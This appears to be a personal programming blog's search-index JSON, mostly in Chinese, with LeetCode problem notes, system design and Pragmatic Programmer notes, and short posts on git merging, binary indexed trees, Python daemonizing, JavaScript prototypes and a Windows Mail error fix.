last index. Example 1:Input: nums = [2,3,1,1,4]Output: 2Explanation: The minimum number of jumps to reach the last index is 2. Jump 1 step from index 0 to 1, then 3 steps to the last index.Example 2:Input: nums = [2,3,0,1,4]Output: 2 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["Dynamic Programming","Array","Greedy"]},{"title":"leetcode-454 - 4Sum II","url":"/2021/01/leetcode-454/","content":"動機\n這題是靠觀察時間複雜度找到解法的\n\nProblem\nGiven four integer arrays nums1, nums2, nums3, and nums4 all of length n, return the number of tuples (i, j, k, l) such that:0  nums1[1] + nums2[1] + nums3[0] + nums4[0] = 2 + (-1) + (-1) + 0 = 0Example 2:Input: nums1 = [0], nums2 = [0], nums3 = [0], nums4 = [0]Output: 1 Constraints:n == nums1.lengthn == nums2.lengthn == nums3.lengthn == nums4.length1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Hash Table"]},{"title":"leetcode-523 - Continuous Subarray Sum","url":"/2021/01/leetcode-523/","content":"動機\n要與560一起看\n\nProblem\nGiven an integer array nums and an integer k, return true if nums has a continuous subarray of size at least two whose elements sum up to a multiple of k, or false otherwise.An integer x is a multiple of k if there exists an integer n such that x = n * k. 0 is always a multiple of k. Example 1:Input: nums = [23,2,4,6,7], k = 6Output: trueExplanation: [2, 4] is a continuous subarray of size 2 whose elements sum up to 6.Example 2:Input: nums = [23,2,6,4,7], k = 6Output: trueExplanation: [23, 2, 6, 4, 7] is an continuous subarray of size 5 whose elements sum up to 42.42 is a multiple of 6 because 42 = 7 * 6 and 7 is an integer.Example 3:Input: nums = [23,2,6,4,7], k = 13Output: false Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Math","Prefix Sum","Hash Table"]},{"title":"leetcode-543 - Diameter of Binary Tree","url":"/2021/01/leetcode-543/","content":"動機\n除了到根的，還有左右兩邊接起來的\n\nProblem\nGiven the root of a binary tree, return the length of the diameter of the tree.The diameter of a binary tree is the length of the longest path between any two nodes in a tree. This path may or may not pass through the root.The length of a path between two nodes is represented by the number of edges between them. Example 1:Input: root = [1,2,3,4,5]Output: 3Explanation: 3 is the length of the path [4,2,1,3] or [5,2,1,3].Example 2:Input: root = [1,2]Output: 1 Constraints:The number of nodes in the tree is in the range [1, 104].-100 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","seanprashad"],"tags":["Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-55 - Jump Game","url":"/2021/01/leetcode-55/","content":"動機\n我是看Solution才知道有人用DP\n\nProblem\nYou are given an integer array nums. You are initially positioned at the array's first index, and each element in the array represents your maximum jump length at that position.Return true if you can reach the last index, or false otherwise. Example 1:Input: nums = [2,3,1,1,4]Output: trueExplanation: Jump 1 step from index 0 to 1, then 3 steps to the last index.Example 2:Input: nums = [3,2,1,0,4]Output: falseExplanation: You will always arrive at index 3 no matter what. Its maximum jump length is 0, which makes it impossible to reach the last index. Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Array","Greedy"]},{"title":"leetcode-56 - Merge Intervals","url":"/2021/01/leetcode-56/","content":"動機\n這題的解法，其實是解skyline的時候，試過的解法\n\nProblem\nGiven an array of intervals where intervals[i] = [starti, endi], merge all overlapping intervals, and return an array of the non-overlapping intervals that cover all the intervals in the input. Example 1:Input: intervals = [[1,3],[2,6],[8,10],[15,18]]Output: [[1,6],[8,10],[15,18]]Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6].Example 2:Input: intervals = [[1,4],[4,5]]Output: [[1,5]]Explanation: Intervals [1,4] and [4,5] are considered overlapping. Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Array","Sorting"]},{"title":"leetcode-57 - Insert Interval","url":"/2021/01/leetcode-57/","content":"動機\n先把interval混進去，再跑merge interval\n\nProblem\nGiven a set of non-overlapping intervals, insert a new interval into the intervals (merge if necessary).You may assume that the intervals were initially sorted according to their start times. Example 1:Input: intervals = [[1,3],[6,9]], newInterval = [2,5]Output: [[1,5],[6,9]]Example 2:Input: intervals = [[1,2],[3,5],[6,7],[8,10],[12,16]], newInterval = [4,8]Output: [[1,2],[3,10],[12,16]]Explanation: Because the new interval [4,8] overlaps with [3,5],[6,7],[8,10].Example 3:Input: intervals = [], newInterval = [5,7]Output: [[5,7]]Example 4:Input: intervals = [[1,5]], newInterval = [2,3]Output: [[1,5]]Example 5:Input: intervals = [[1,5]], newInterval = [2,7]Output: [[1,7]] Constraints:0 ","categories":["Algorithm","Leetcode","seanprashad","Blind Curated 75"],"tags":["Array"]},{"title":"leetcode-581 - Shortest Unsorted Continuous Subarray","url":"/2021/01/leetcode-581/","content":"動機\n當初想說只要看到第一個不對的點就可以了，但沒想到的是overlap與根本沒有需要的case…，所以一直出事\n[1,2,3,3,3]\n\nProblem\nGiven an integer array nums, you need to find one continuous subarray that if you only sort this subarray in ascending order, then the whole array will be sorted in ascending order.Return the shortest such subarray and output its length. Example 1:Input: nums = [2,6,4,8,10,9,15]Output: 5Explanation: You need to sort [6, 4, 8, 10, 9] in ascending order to make the whole array sorted in ascending order.Example 2:Input: nums = [1,2,3,4]Output: 0Example 3:Input: nums = [1]Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Array","Stack","Two Pointers","Greedy","Sorting","Monotonic Stack"]},{"title":"leetcode-6 - ZigZag Conversion","url":"/2021/01/leetcode-6/","content":"動機\n只要看出怎麼遞迴，剩下就是細心的問題\n\nProblem\nThe string PAYPALISHIRING is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)P   A   H   NA P L S I I GY   I   RAnd then read line by line: PAHNAPLSIIGYIRWrite the code that will take a string and make this conversion given a number of rows:string convert(string s, int numRows); Example 1:Input: s = PAYPALISHIRING, numRows = 3Output: PAHNAPLSIIGYIRExample 2:Input: s = PAYPALISHIRING, numRows = 4Output: PINALSIGYAHRPIExplanation:P     I    NA   L S  I GY A   H RP     IExample 3:Input: s = A, numRows = 1Output: A Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve"],"tags":["String"]},{"title":"leetcode-647 - Palindromic Substrings","url":"/2021/01/leetcode-647/","content":"動機\n第一次看到DP比較慢\n\nProblem\nGiven a string s, return the number of palindromic substrings in it.A string is a palindrome when it reads the same backward as forward.A substring is a contiguous sequence of characters within the string. Example 1:Input: s = abcOutput: 3Explanation: Three palindromic strings: a, b, c.Example 2:Input: s = aaaOutput: 6Explanation: Six palindromic strings: a, a, a, aa, aa, aaa. Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","String"]},{"title":"leetcode-653 - Two Sum IV - Input is a BST","url":"/2021/01/leetcode-653/","content":"動機\n主要是紀錄在tree上做這題的做法\n\nProblem\nGiven the root of a Binary Search Tree and a target number k, return true if there exist two elements in the BST such that their sum is equal to the given target. Example 1:Input: root = [5,3,6,2,4,null,7], k = 9Output: trueExample 2:Input: root = [5,3,6,2,4,null,7], k = 28Output: falseExample 3:Input: root = [2,1,3], k = 4Output: trueExample 4:Input: root = [2,1,3], k = 1Output: falseExample 5:Input: root = [2,1,3], k = 3Output: true Constraints:The number of nodes in the tree is in the range [1, 104].-104 ","categories":["Algorithm","Leetcode"],"tags":["Breadth-First Search","Depth-First Search","Two Pointers","Hash Table","Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-678 - Valid Parenthesis String","url":"/2021/01/leetcode-678/","content":"動機\n\nProblem\nGiven a string s containing only three types of characters: '(', ')' and '*', return true if s is valid.The following rules define a valid string:Any left parenthesis '(' must have a corresponding right parenthesis ')'.Any right parenthesis ')' must have a corresponding left parenthesis '('.Left parenthesis '(' must go before the corresponding right parenthesis ')'.'*' could be treated as a single right parenthesis ')' or a single left parenthesis '(' or an empty string . Example 1:Input: s = ()Output: trueExample 2:Input: s = (*)Output: trueExample 3:Input: s = (*))Output: true Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","String","Stack","Greedy"]},{"title":"leetcode-703 - Kth Largest Element in a Stream","url":"/2021/01/leetcode-703/","content":"動機\n當初想的太複雜了，還想用兩個heap\n\nProblem\nDesign a class to find the kth largest element in a stream. Note that it is the kth largest element in the sorted order, not the kth distinct element.Implement KthLargest class:KthLargest(int k, int[] nums) Initializes the object with the integer k and the stream of integers nums.int add(int val) Returns the element representing the kth largest element in the stream. Example 1:Input[KthLargest, add, add, add, add, add][[3, [4, 5, 8, 2]], [3], [5], [10], [9], [4]]Output[null, 4, 5, 5, 8, 8]ExplanationKthLargest kthLargest = new KthLargest(3, [4, 5, 8, 2]);kthLargest.add(3);   // return 4kthLargest.add(5);   // return 5kthLargest.add(10);  // return 5kthLargest.add(9);   // return 8kthLargest.add(4);   // return 8 Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve","CTCI-COMPLETE-LIST"],"tags":["Design","Heap (Priority Queue)","Binary Tree","Tree","Binary Search Tree","Data Stream"]},{"title":"leetcode-714 - Best Time to Buy and Sell Stock with Transaction Fee","url":"/2021/01/leetcode-714/","content":"動機\n與309、188一起看效果更佳\n\nProblem\nYou are given an array prices where prices[i] is the price of a given stock on the ith day, and an integer fee representing a transaction fee.Find the maximum profit you can achieve. You may complete as many transactions as you like, but you need to pay the transaction fee for each transaction.Note: You may not engage in multiple transactions simultaneously (i.e., you must sell the stock before you buy again). Example 1:Input: prices = [1,3,2,8,4,9], fee = 2Output: 8Explanation: The maximum profit can be achieved by:- Buying at prices[0] = 1- Selling at prices[3] = 8- Buying at prices[4] = 4- Selling at prices[5] = 9The total profit is ((8 - 1) - 2) + ((9 - 4) - 2) = 8.Example 2:Input: prices = [1,3,7,5,10,3], fee = 3Output: 6 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Greedy"]},{"title":"leetcode-739 - Daily Temperatures","url":"/2021/01/leetcode-739/","content":"動機\n現在只要用到stack就會讓我想到merge interval\n\nProblem\nGiven an array of integers temperatures represents the daily temperatures, return an array answer such that answer[i] is the number of days you have to wait after the ith day to get a warmer temperature. If there is no future day for which this is possible, keep answer[i] == 0 instead. Example 1:Input: temperatures = [73,74,75,71,69,72,76,73]Output: [1,1,4,2,1,1,0,0]Example 2:Input: temperatures = [30,40,50,60]Output: [1,1,1,0]Example 3:Input: temperatures = [30,60,90]Output: [1,1,0] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["Array","Stack","Monotonic Stack"]},{"title":"leetcode-763 - Partition Labels","url":"/2021/01/leetcode-763/","content":"動機\n看到greedy解後恍然大悟\n\nProblem\nYou are given a string s. We want to partition the string into as many parts as possible so that each letter appears in at most one part.Return a list of integers representing the size of these parts. Example 1:Input: s = ababcbacadefegdehijhklijOutput: [9,7,8]Explanation:The partition is ababcbaca, defegde, hijhklij.This is a partition so that each letter appears in at most one part.A partition like ababcbacadefegde, hijhklij is incorrect, because it splits s into less parts.Example 2:Input: s = eccbbbbdecOutput: [10] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["String","Two Pointers","Greedy","Hash Table"]},{"title":"leetcode-779 - K-th Symbol in Grammar","url":"/2021/01/leetcode-779/","content":"動機\n十分有趣的題目\n\nProblem\nWe build a table of n rows (1-indexed). We start by writing 0 in the 1st row. Now in every subsequent row, we look at the previous row and replace each occurrence of 0 with 01, and each occurrence of 1 with 10.For example, for n = 3, the 1st row is 0, the 2nd row is 01, and the 3rd row is 0110.Given two integer n and k, return the kth (1-indexed) symbol in the nth row of a table of n rows. Example 1:Input: n = 1, k = 1Output: 0Explanation: row 1: 0Example 2:Input: n = 2, k = 1Output: 0Explanation:row 1: 0row 2: 01Example 3:Input: n = 2, k = 2Output: 1Explanation:row 1: 0row 2: 01Example 4:Input: n = 3, k = 1Output: 0Explanation:row 1: 0row 2: 01row 3: 0110 Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve"],"tags":["Recursion","Math","Bit Manipulation"]},{"title":"leetcode-877 - Stone Game","url":"/2021/01/leetcode-877/","content":"動機\n每次看到math的解法，都會想是不是有鬼，所以不會去想，還有原本就是要練DP，所以要不會往那邊想…\n\nProblem\nAlex and Lee play a game with piles of stones.  There are an even number of piles arranged in a row, and each pile has a positive integer number of stones piles[i].The objective of the game is to end with the most stones.  The total number of stones is odd, so there are no ties.Alex and Lee take turns, with Alex starting first.  Each turn, a player takes the entire pile of stones from either the beginning or the end of the row.  This continues until there are no more piles left, at which point the person with the most stones wins.Assuming Alex and Lee play optimally, return True if and only if Alex wins the game. Example 1:Input: piles = [5,3,4,5]Output: trueExplanation: Alex starts first, and can only take the first 5 or the last 5.Say he takes the first 5, so that the row becomes [3, 4, 5].If Lee takes 3, then the board is [4, 5], and Alex takes 5 to win with 10 points.If Lee takes the last 5, then the board is [3, 4], and Alex takes 4 to win with 9 points.This demonstrated that taking the first 5 was a winning move for Alex, so we return true. Constraints:2 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Math","Game Theory"]},{"title":"system design primer筆記 設計流程與估算篇","url":"/2021/01/system-design-primer-note2/","content":"動機\n這次是設計流程與估算\n設計系統，要先做出評估與假設\n分成user與system\nuser部分要問，誰會用、怎麼用、多少人\n對system而言，會先收到request，之後變成data，之後要io\n所以system部分要問，做什麼、input/output是、每秒處理多少request、希望處理多少資料、預期的讀、寫比例\n\n系統設計流程\n\n描述使用的場景、限制及假設\n\n\nuser\n\n誰會使用這個系統\n他們怎麼使用系統\n有多少使用者\n\n\nsystem\n\n系統的作用是什麼\n系統的輸入和輸出是什麼\n輸入\n\n希望每秒處理多少請求\n\n預期希望處理多少資料\n\n預期的讀、寫比例為何\n\n\n\n\n\n\n\n\nuser*N == req*N ==&gt; (system :: read/write) == res ==&gt; user\n\n\n建立一個高階的設計\n\n\n畫出主要的元件與其相互連接情況\n\n\n設計核心的元件\n\n\n對每一個核心元件進行深入的分析 (要用什麼實作, SQL/NoSQL, schema, …)\n\n\n評估你的設計\n\n\n確認及指出你的設計的瓶頸與限制\n\n估算\n\nRead 1 MB sequentially from memory: 250 us\nRead 1 MB sequentially from SSD: 1,000 us,1 ms (~1GB/sec SSD, 4X memory)\nRead 1 MB sequentially from 1 Gbps: 10,000 us,10 ms (40x memory, 10X SSD)\nRead 1 MB sequentially from disk: 30,000 us,30 ms (120x memory, 30X SSD)\n\n","categories":["System","System Design"]},{"title":"system design primer筆記 範例篇","url":"/2021/01/system-design-primer-note3/","content":"動機\n這是system design primer筆記的最後一篇，講要怎麼把system一步一步scale out\n但還是有沒提到的部分，像NoSQL/SQL的實際比較、DB的優化手法比較，這些都是輕描淡寫帶過去而已，儘管如此\n\n建議閱讀順序\n先讀 Design a system that scales to millions of users on AWS\n再看其他題目\n整理\nkeyword大概的感覺\n\nAPI: controller in MVC\nservice: functions implmenting bussness logic\n\nevoluation\n從single box一步一步把功能分離出來，要注意手法是怎麼與痛點關連起來\n其實最核心的想法是把bottleneck分離出來，如果分離出來還不夠，就是多台(水平scale)，之後就是自動scale，來省$$\nDB的多台就是failover或是replica，還有一種是分割，有 從table去切、從DB去切\n最後設計系統就是分析需求，把動詞找出來，變成service，之後開API給使用者呼叫\nsingle box\n\nweb server: DB(structrual&amp;static&amp;tmp) + APP write(real-time&amp;batch) + APP read + Req handle(session data) + SSL\n\nhow to scale:\n\nVertical Scaling\n\nUse basic monitoring to determine bottlenecks: CPU, memory, IO, network, etc\nNo redundancy/failover\nexpensive\n\n\n\n\nseparate storage(DB + obejct store)\n\npain: MySQL Database taking up more and more memory and CPU resources\nweb server: APP write(real-time&amp;batch) + APP read + Req handle + SSL\nDB: DB(structrual&amp;tmp)(write&amp;read)\nobejct store: SQL/NoSQl/S3(static)\n\n\nHorizontal Scaling &amp; separate APP\n\npain: single Web Server bottlenecks during peak hours\nlaod balancers: SSL\nweb servers: Req handle\nAPP writes: APP write(real-time&amp;batch)\nAPP reads: APP raed\nDBs: DB(structrual&amp;tmp)(write&amp;read) (active-active or active-passive)\nCDN: proxy server to object store(static)\nobejct store: SQL/NoSQl/S3(static)\n\nhow to scale:\n\nHorizontal Scaling\n\nmultiple instances to handle requests\n\n\n\n\nmemory cache &amp; read replicas\n\npain: read-heavy\nlaod balancers: SSL\nweb servers: Req handle\nAPP writes: APP write(real-time&amp;batch)\nAPP reads: APP raed\nmemory cache: memory cache(structrual)\nDBs: DB(structrual&amp;tmp)(write) (active-active or active-passive)\nDBs: DB(structrual&amp;tmp)(read) (active-active or active-passive)\nCDN: proxy server to object store(static)\nobejct store: SQL/NoSQl/S3(static)\n\n\nmemory cache &amp; read replicas\n\npain: traffic spikes during regular business hours and drop significantly (cost)\nlaod balancers: SSL\nauto-scaling (CPU load, Latency, Network traffic, Custom metric)\n\nweb servers: Req handle\nAPP writes: APP write(real-time&amp;batch)\nAPP reads: APP raed\nmemory cache: memory cache(structrual)\n\n\nDBs: DB(structrual&amp;tmp)(write) (active-active or active-passive)\nDBs: DB(structrual&amp;tmp)(read) (active-active or active-passive)\nCDN: proxy server to object store(static)\nobejct store: SQL/NoSQl/S3(static)\n\nhow to scale:\n\nHorizontal Scaling\n\nmultiple instances to handle requests\n\n\nAutomate DevOps\nContinue monitoring metrics to address bottlenecks\n\nHost level - Review a single EC2 instance\nAggregate level - Review load balancer stats\nLog analysis - CloudWatch, CloudTrail, Loggly, Splunk, Sumo\nExternal site performance - Pingdom or New Relic\nHandle notifications and incidents - PagerDuty\nError Reporting - Sentry\n\n\n\n\nasync write &amp; DB optimization\n\npain: DB starts to grow too large &amp; high read&amp;write req\nlaod balancers: SSL\nauto-scaling (CPU load, Latency, Network traffic, Custom metric)\n\nweb servers: Req handle\nAPP writes: APP write(real-time&amp;batch)\nAPP reads: APP raed\nqueues: msg queue\nworker services: handle req\nmemory cache: memory cache(structrual)\n\n\nNoSQL: DB(tmp)\nDBs: DB(structrual)(write) (active-active or active-passive)\n\nSQL scaling patterns include:\n\nFederation\nSharding\nDenormalization\nSQL Tuning\n\n\n\n\nDBs: DB(structrual)(read) (active-active or active-passive)\n\nSQL scaling patterns include:\n\nFederation\nSharding\nDenormalization\nSQL Tuning\n\n\n\n\nCDN: proxy server to object store(static)\nobejct store: SQL/NoSQl/S3(static)\n\n\nRef\nsource\n","categories":["System","System Design"]},{"title":"The Pragmatic Programmer快速翻閱節錄","url":"/2021/02/The-Pragmatic-Programmer-reflection/","content":"動機\n翻翻The Pragmatic Programmer 20週年紀念版的一些紀錄我感覺很重要的部分\n\n節錄\n\nEasy to change(ETC)\n\nDRY: 在一個系統中，每一條知識都必須有一個、單一、明確、權威的表現\n\nex: code, API, schema, 功能, 文件\n\n\n正交性: 不互相影響，元件是self-contained\n可逆性: 可以變動\n\n\n曳光彈: 可以即時反饋、最簡化的系統\n\n原形主要用在proof of concept，用完即丟，但曳光彈可以繼續發展下去\n\n\n評估: 一項應該培養起來的技能\n\nquestion -&gt; build model -&gt; design components -&gt; give some assumed vals -&gt; compute -&gt; analyze estimates\n\n\n用VCS(like git)控管\n\nuser setting (like .bashrc)\neditor setting (like .vimrc)\n已安裝的software列表\nansible腳本\n開發的repo\n\n\n工作日誌 (以天為單位)\n\n做了什麼\n突然出現的想法\ndebug的變數\n等等…\n\n\n合約式編程: precond, postcond, class invariant\n\n如果有cond被打破就要跑補救措施\n\n\n關於assertion\n\n用assertion寫下不可能發生的事\nassertion不要有state\n\n(X) assert(iter.next() != NULL)\n(O) obj=iter.next(); assert(obj != NULL)\n\n\n除非這個assertion會有重大效能影響，不然就留著，可以對debug(from end-user)有很大的幫助\n\n\n將設定(setting)用成一種service不是只有text file，可以方便取得數值與控制access\n測試以attribute為基礎: 設定參數的範圍，之後random生，去測試\n需求是一種流程(沒有一次就定下來的): 想法 &lt;=&gt; 疑問(某些edge case之類) 之間的反覆來回\n不是跳出框框思考，而是找到框框 (邊界在哪)\n支撐project的三項支柱\n\n版本控制: drive build, test, deploy 的流程\n回歸測試\n完全自動化\n\n\n\nTODO\n身陷TDD，把test當成考題的例子\nConstraint Propagation，感覺很屌\n","categories":["Reading"]},{"title":"apply patch到在不同資料夾不同的檔案名的檔案","url":"/2021/02/apply-patch-to-different-file-in-different-folder/","content":"動機\n之前遇到，要apply一個patch到十分類似的檔案，雖然說十分類似，但還是會想說會不會因為有不同的地方所以會報錯之類的，結果沒有，所以記錄一下\n\npatch\ngit diff HEAD^ -- hello.test &gt; ~/patch_filecd ../second-repopatch -p1 blue/red/hi.test ~/patch_file\n直接用就好，順便說一下，patch的-p是把patchfile中的path扣去一位的意思，例如\n/a/b/c =&gt;(-p1) a/b/c/a/b/c =&gt;(-p3) c\nRef\nHow to apply a Git patch to a file with a different name and path?\npatch man\n","categories":["Utils","Git"]},{"title":"binary index tree","url":"/2021/02/bit/","content":"動機\n當初看binary index tree看了很久，要記錄一下\n\nbinary index tree\ntree的樣子\n\nbuild\n因為是prefix sum所以如果從底部往上建，就是把目前建好的node往上一層送\n像是1~1就是1~2的前半部，1~4就是1~2與3~3\n那要怎麼決定要往那一個地方送?\n這就是特別的地方了，往n+lowbit(n)\nlowbit定義成離左邊(最低位)最近的第一個1，像\n\nlowbit(1) =&gt; 1\nlowbit(2) =&gt; 2\nlowbit(3) =&gt; 1\n\n因為每次往上都是遞增一個lowbit(n)，所以很像list\ndef __init__(self,arr):    self.n = len(arr)    self.bit = [0] * (1+self.n)        for (i,n) in enumerate(arr):        i += 1 # bit start from 1        self.bit[i] += n        nextI = i + (i&amp;(-i)) # lowbit(i)        if nextI &lt;= self.n:            self.bit[nextI] += self.bit[i]\nupdate\n剛剛的build是從底往上，update也是所以兩個很像\ndef update(self,i,diff):    while i &lt;= self.n:        self.bit[i] += diff        i += (i&amp;(-i))\nquery\nbuild與update都是往上加lowbit(n)，query可以類推成扣lowbit(n)?\n對\ndef query(self,n): # [1..n]    ret = 0    while n &gt; 0:        ret += self.bit[n]        n -= (n&amp;(-n))    return ret\n為什麼是lowbit?\n從lowbit去看每個區間會發現lowbit(n)到左邊(最低位)的距離就是會有幾個區間要加，像\n\nlowbit(1) =&gt; 0 (就是自己)\nlowbit(2) =&gt; 1 (1~1與自己)\nlowbit(4) =&gt; 2 (1~2與3~3與自己)\n\n還有lowbit(n)到左邊(最低位)的range，如果有1可以看成有幾個node，像\n\n1~5 =&gt; 101，1~4與5~5\n1~7 =&gt; 111，1~4與5~6與7~7\n\n從這裡也可以看出來，為什麼bit的query是1~n，因為是透過binary去看有幾個1去加總\n所以，bit就是利用binary來表示有幾個區間的prefix sum tree\nRef\n這應該是最好懂bit的資料\n","categories":["Algorithm","Classic"]},{"title":"daemonize與sig與pgid","url":"/2021/02/daemonize/","content":"動機\n碰到daemonize來記錄一下\n\nSID, PGID\n\nprocess都有一個pid\n一堆process可以組成process group，就會有一個pgid\n\ngroup收到的signal會送給旗下所有的process\n\n\n一堆process group可以組成session，就會有一個sid\n\nsession會綁定到一個tty\n\n\n\ndaemonize\ndaemon的目的\n\n在背景執行\n獨立於其他session (自成一體)\ntty不見了也要能動 (獨立於tty)\n\n所以daemonize的步驟是\n\nfork一個子process\n讓父process退出 (子process現在與父process無關，在背景執行)\n在子process創立新的session (獨立於其他session)\n\n\n因為是該session的第一個session，所以會與tty綁定\n另外，此時也可以\n\n把不需要fd關掉\n把umask設好，也許parent的不符合daemon的需求\n\n\n\n\nfork一個子process (獨立於tty)\n\ntry:    pid = os.fork()    if pid &gt; 0:        # Exit first parent        sys.exit(0)except OSError as e:    sys.stderr.write(        &quot;fork #1 failed: %d (%s)\\n&quot; % (e.errno, e.strerror))    sys.exit(1)# Decouple from parent environmentos.chdir(self.home_dir)os.setsid()os.umask(self.umask)# Do second forktry:    pid = os.fork()    if pid &gt; 0:        # Exit from second parent        sys.exit(0)except OSError as e:    sys.stderr.write(        &quot;fork #2 failed: %d (%s)\\n&quot; % (e.errno, e.strerror))    sys.exit(1)\nRef\nDaemonize 一个进程为什么需要 fork 两次\n","categories":["System","Linux","FAQ"]},{"title":"英文文法隨便筆記","url":"/2021/02/eng-grammer/","content":"動機\n隨手筆記，不期待有人看懂，就只是做紀錄了\n另外特別感謝google的natural language API\n\n逗點\nCompound Sentence: 為什麼and之前要逗點\n要區分是以\n\n詞\n句\n\n為單位，做連接\n一般來說，都是接前面同屬性的詞，但是加了逗點就變成接句子\nComplex Sentence: 為什麼When放前面要逗號\n這樣可以放很多句，因為主要句只有一句(以對等連接詞為分界)要修飾，像\nAlthough my mother runs, although my mother runs, I am tall, and she is short, but when she flees, he goes.\n的syntax tree大概像\n(  (I am tall    (Although my mother runs)    (Although my mother runs))  and  (she is short)  but  (he goes    (when she flees)))\n可以看google的natural language API示範的syntax\ndash\n可以當成\n\n逗號\n冒號\n分號\n\n我在toefl TPO最常看到是當成插入句用，所以會出現兩個dash，像\nIf nature did not cooperate-if the winter proved dry and warm, if the spring thaw was delayed-production would suffer.\n倒裝\nSVO =&gt; OSV\n這樣O與S接在一起無法區分兩者，一個是加逗號，那有不加逗號的方法嗎?\n把V放前面? (OVS)\n這樣與SVO一樣啊\n所以把時態(這裡叫他T)拉出來擋在主詞與O之間\nS(T)VO =&gt; OTSV\n時態\n\n點就是時間點由\n\n起點\n終點\n\n組成，有的事件起點就是終點，就是那些沒有be Ving的動詞\n時態是由下面的四個屬性構成\n過去 * will * have * Ving\n過去: 點不在右下角?\nwill: 點要往前放?\nhave: 終點在這或是之前?\nVing: 起點在前面?\n","categories":["English"]},{"title":"git conflict 與 three-ways-merge","url":"/2021/02/git-conflict-and-three-ways-merge/","content":"動機\n之前有遇過，但沒有好好認識他，來記錄一下\n\nthree-ways mrege\n原本只有兩個檔案做diff，這樣沒辦法分辨要留下哪一個，只能標出哪邊不一樣\n所以還需要一個共同來源的檔案，來做基準\n那要怎麼確定要把哪個改動留下來?\n只要其中一個檔案沒變過，另外一個卻變了，就要保留這個變化\nRecursive three-ways merge\n\n如果要merge兩個merge commit，就有可能遇到圖上的狀況，這樣無法決定要取哪一個commit，所以這裡就把這兩個commit做merge，用這個新commit做共同祖先\n另外，cherry-pick也是three-ways mrege，只不過祖先是取被cherry-pick的commit的前一個\nRef\nGit三路合并算法(Three Way Merge)\n","categories":["Utils","Git"]},{"title":"js的proto與metaclass","url":"/2021/02/js-proto-metaclass/","content":"動機\n之前在看js的proto時，突然想起之前看的metaclass\n\nproto就是上一層\n原本是說物件是在這層沒有找到就要往上找，在js就是proto\n物件的上一層就是class，class的上一層就是parent\nvar nick = new Person(&#x27;nick&#x27;, 18);console.log(nick.__proto__ === Person.prototype) // true\njs只有一個指標，但metaclass有兩個，why?\njs只有一個指標，所以很好懂，也很直覺，但\n\n這樣就不能玩metaclass的那些奇異功能，因為所有method都放在同一個地方\n不好模擬private，因為所有method都放在同一個地方，像js要自己用clousre包\n\njs的this\n會要這個就是method阿，也就是說，js把method當成一級function用…\n但this因為是關鍵字，所以不能用單純的變數去看\n\n如果在object中宣告，以及在被調用時有使用物件，就用物件作為this\n如果都沒有就是windows(global)\n\n順便記一下: JavaScript是synchronous在執行的\nfunction waitThreeSeconds()&#123; var ms = 3000 + new Date().getTime(); while(new Date() &lt; ms)&#123;&#125; console.log(&quot;finished function&quot;);&#125;function clickHandler()&#123; console.log(&quot;click event!&quot;);&#125;document.addEventListener(&#x27;click&#x27;, clickHandler);console.log(&quot;started execution&quot;);waitThreeSeconds();console.log(&quot;finished execution&quot;);/*started executionfinished executionclick event! * n*/\n在等的時候點擊，waitThreeSeconds沒有被中斷，而是會等到跑完再反映事件\n先把execution context的內容執行完畢，接著才去執行&quot;event queue&quot;\nRef\n該來理解 JavaScript 的原型鍊了\n談談 JavaScript 中的 “this” 和它的問題\n談談JavaScript中的asynchronous和event queue\n","categories":["Javascript","FAQ"]},{"title":"leetcode-307 - Range Sum Query - Mutable","url":"/2021/02/leetcode-307/","content":"動機\nsegment tree 與 binary index tree的練習題\n\nProblem\nGiven an integer array nums, handle multiple queries of the following types:Update the value of an element in nums.Calculate the sum of the elements of nums between indices left and right inclusive where left ","categories":["Algorithm","Leetcode"],"tags":["Array","Design","Segment Tree","Binary Indexed Tree"]},{"title":"leetcode-327 - Count of Range Sum","url":"/2021/02/leetcode-327/","content":"動機\n使用divide and conquer的時機是?\n\nProblem\nGiven an integer array nums and two integers lower and upper, return the number of range sums that lie in [lower, upper] inclusive.Range sum S(i, j) is defined as the sum of the elements in nums between indices i and j inclusive, where i ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Divide and Conquer","Binary Search","Merge Sort","Ordered Set","Segment Tree","Binary Indexed Tree"]},{"title":"leetcode-493 - Reverse Pairs","url":"/2021/02/leetcode-493/","content":"動機\n個數、i&lt;j，使用divide and conquer的時機!!\n\nProblem\nGiven an integer array nums, return the number of reverse pairs in the array.A reverse pair is a pair (i, j) where 0 ","categories":["Algorithm","Leetcode"],"tags":["Array","Divide and Conquer","Binary Search","Merge Sort","Ordered Set","Segment Tree","Binary Indexed Tree"]},{"title":"設定windows-mail出現0x80070490的錯誤碼","url":"/2021/02/windows-mail-0x80070490-err-code/","content":"動機\n重灌電腦遇到紀錄一下\n\nSol\n\n點開始旁邊的放大鏡打Services，點元件服務\n點服務(本機)，找Credential Manager Service\n把啟動類型改成自動，點確定\nreboot\n\nRef\nWindows 10 Getting Error Message (0x80070425) when adding account in Mail 